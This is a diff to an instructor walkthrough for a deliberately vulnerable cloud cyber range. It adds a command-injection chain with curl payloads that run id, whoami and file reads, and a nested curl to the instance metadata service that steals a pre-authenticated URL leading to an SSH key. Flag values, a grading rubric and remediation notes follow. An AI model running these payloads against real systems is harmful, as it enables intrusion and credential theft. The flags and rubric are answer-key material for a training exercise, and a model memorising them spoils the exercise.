@@ -4,9 +4,16 @@ Full exact chain, real commands, against a genuinely deployed OCI range (see
 `../terraform/`). Nothing here is simulated — every command below hits real
 OCI services and real Compute instances.
 
+This range has **two independent vulnerabilities**, on two different Staff
+Tools pages, leading to the *same* eventual goal (a shell on `internal-01`)
+by two genuinely different routes — not one chain split into two labs. Give
+different students/team members different chains if you want to avoid
+identical writeups: Chain A (SSRF) is Stages 1–5 below; Chain B (command
+injection) is its own section further down.
+
 ---
 
-## Stage 1: SSRF → reach OCI instance metadata
+## Chain A (Flag 1): SSRF → reach OCI instance metadata
 
 The `/preview` route in `app/web_app.py` fetches any URL server-side, and
 forwards an optional `headers=` JSON param through untouched — that's what's
@@ -83,12 +90,68 @@ cat /opt/meridian-internal/customer-export-notice.txt
 
 ---
 
+## Chain B (Flag 2): OS command injection → real RCE on web-01
+
+Different vulnerability class from Chain A, on a different Staff Tools
+page. Genuinely different bug (`shell=True` string formatting, not a
+missing allow-list) — not a variant of the same SSRF.
+
+### B1: Find the injection
+
+`/tools/lookup` runs `whois` on whatever `domain=` you pass, via
+`subprocess.run(f"whois {domain}", shell=True, ...)` in `app/web_app.py` —
+no sanitization, no argument-list form. Anything after a shell metacharacter
+(`;`, `|`, `&&`, backticks, `$(...)`) runs as a second command.
+
+```bash
+curl -sG "https://<web01_domain>/tools/lookup" --data-urlencode "domain=example.com; id"
+```
+Response includes real `whois` output for `example.com` **and** the output
+of `id` — proof of command execution, not just a crash/error.
+
+### B2: This is root RCE, not a limited shell
+
+`cloudbreach-web.service` runs `User=root` (see `terraform/user_data/web01.sh.tpl`)
+— a real, still-too-common misconfiguration this range keeps rather than
+"fixes," specifically so this chain demonstrates full compromise, not a
+low-priv foothold. Confirm:
+```bash
+curl -sG "https://<web01_domain>/tools/lookup" --data-urlencode "domain=x; whoami"
+# whoami output should be: root
+```
+
+### B3: Proof (Flag 2)
+
+```bash
+curl -sG "https://<web01_domain>/tools/lookup" --data-urlencode "domain=x; cat /opt/flag2.txt"
+# flag{e2f73445060fd21acbe97b6794dfbea2}
+```
+
+### B4: Alternate route to the same internal-01 pivot
+
+With real command execution (not just a read-only SSRF primitive), the
+IMDS → PAR → SSH-key chain from Chain A is reachable *more directly* — no
+need for the `headers=` forwarding trick, just run `curl` for real:
+
+```bash
+curl -sG "https://<web01_domain>/tools/lookup" \
+  --data-urlencode 'domain=x; curl -s -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/metadata/backup_recovery_url'
+```
+Returns the same `backup_recovery_url` PAR as Chain A Stage 1 — from here,
+Stages 2–5 above are identical (download the key, find `internal-01`'s
+private IP, pivot, read `/home/ubuntu/flag.txt`). Same destination, two
+genuinely independent ways to get there — live-verified both ways on
+2026-08-26.
+
+---
+
 ## Flag reference
 
-| Stage | Flag | Notes |
-|---|---|---|
-| 1–2 (metadata + PAR leak) | `flag{ebf88885ddcaf4ac84b44c698c0cbdfd}` | Award for successfully retrieving the raw SSH private key content via the metadata → PAR chain — no embedded string in the response itself to check automatically, self-verify by confirming the PEM parses (`openssl rsa -in internal01_key.pem -check`) |
-| 5 (lateral movement) | `flag{fd16978f423c836c563079917db6978a}` | Embedded on `internal-01`, `/home/ubuntu/flag.txt` |
+| Chain | Stage | Flag | Notes |
+|---|---|---|---|
+| A (SSRF) | 1–2 (metadata + PAR leak) | `flag{ebf88885ddcaf4ac84b44c698c0cbdfd}` | Award for successfully retrieving the raw SSH private key content via the metadata → PAR chain — no embedded string in the response itself to check automatically, self-verify by confirming the PEM parses (`openssl rsa -in internal01_key.pem -check`) |
+| A (SSRF) | 5 (lateral movement) | `flag{fd16978f423c836c563079917db6978a}` | Embedded on `internal-01`, `/home/ubuntu/flag.txt` — Chain B also ends here if that route is taken instead |
+| B (command injection) | B3 (RCE proof) | `flag{e2f73445060fd21acbe97b6794dfbea2}` | Embedded on `web-01`, `/opt/flag2.txt`, readable only via actual command execution |
 
 ---
 
@@ -100,10 +163,14 @@ cat /opt/meridian-internal/customer-export-notice.txt
 | Presigned URL stashed in instance metadata | Never place credential material (including presigned URLs) in instance metadata — use Instance Principals + a proper secrets service instead, and treat metadata as attacker-readable the moment any SSRF exists anywhere on the host |
 | PAR with no IP/network restriction | OCI PARs can't be network-scoped, which is exactly why they shouldn't hold long-lived credential-equivalent material — prefer short TTLs and rotate immediately after use if a PAR must be used at all |
 | No IMDS access monitoring | OCI Cloud Guard / Audit logs would flag unusual `GetObject` access patterns on the bucket from outside the expected caller in a real environment |
+| OS command injection in `/tools/lookup` | Never build a shell command via string formatting; use `subprocess.run(["whois", domain], shell=False)` with an argument list, and validate `domain` against a strict hostname pattern regardless |
+| App runs as root (`cloudbreach-web.service`) | Run as an unprivileged, dedicated service account — turns this specific bug from full root RCE into a contained low-priv foothold, a materially different severity even before the injection itself is fixed |
 
 ---
 
 ## Grading rubric (100 pts, adjust as needed)
+
+**Chain A (SSRF):**
 
 | Criterion | Points |
 |---|---|
@@ -114,10 +181,51 @@ cat /opt/meridian-internal/customer-export-notice.txt
 | Demonstrated actual shell/file access on `internal-01` (not just "could reach it") | 25 |
 | Write-up: clear narrative + differentiated remediation priorities | 10 |
 
+**Chain B (command injection)** — same 100-point scale, use whichever chain
+the student was assigned:
+
+| Criterion | Points |
+|---|---|
+| Identified `/tools/lookup` as vulnerable and demonstrated a working injection | 25 |
+| Confirmed the RCE runs as root, not a limited user | 10 |
+| Retrieved Flag 2 via actual command execution (not guessed) | 15 |
+| Used the RCE to reach the same `backup_recovery_url` PAR (Stage B4) | 20 |
+| Completed the pivot into `internal-01` | 20 |
+| Write-up: clear narrative + differentiated remediation priorities, including the root-execution finding as its own item, not folded into the injection finding | 10 |
+
 ---
 
 ## Known limitations / honest caveats
 
+- **Chain B (command injection) added and live-verified 2026-08-26** —
+  built specifically so a second student/team member gets a genuinely
+  different vulnerability class to exercise instead of redoing Chain A's
+  SSRF. Verified all of: normal `whois` use working, `; id` proving real
+  command execution, confirmed running as root, Flag 2 retrieved via
+  injection, and the alternate B4 route reaching the same PAR as Chain A
+  (both chains independently confirmed to reach `internal-01`'s flag).
+- **`allowed_cidr` needs updating if your own IP changes** — hit this
+  directly while verifying Chain B: the operator's home/mobile IP had
+  changed since the range was first deployed, so ports 22/443 (still
+  scoped to the original `allowed_cidr`) silently stopped being reachable
+  from the new IP (port 80 stayed fine, since that one's deliberately
+  `0.0.0.0/0` for Certbot). SSH still worked briefly during diagnosis
+  despite this, most likely because the ISP's CGNAT/dynamic routing sent
+  that particular TCP connection out through a different, still-allowed
+  egress IP than the one HTTPS used seconds later — not a bug in the NSG
+  config, just a reminder that "SSH still works" isn't proof `allowed_cidr`
+  is current. Fix is always the same: re-check `curl -s
+  https://checkip.amazonaws.com`, update `terraform.tfvars`, `terraform
+  apply` (NSG-only change, ~1s, no instance impact).
+- **A `curl` "SSL connect error" / `CRYPT_E_REVOCATION_OFFLINE` while
+  testing from Windows** is a local Windows Schannel issue (it couldn't
+  reach the certificate's OCSP revocation-check endpoint from that
+  specific machine at that moment), not a problem with the range's cert
+  or server — confirmed by the exact same request succeeding immediately
+  with `curl --ssl-no-revoke`, and by the server-side logs showing nginx
+  and the app both healthy the whole time. If you hit this, it's worth
+  retrying plain first (transient network blips clear up) before assuming
+  anything is actually broken server-side.
 - **Live-verified end-to-end 2026-08-25** against a real deployed range
   (tenancy region `ap-singapore-1`): SSRF → `Bearer Oracle` header bypass →
   instance metadata → `backup_recovery_url` → real PAR → real SSH private
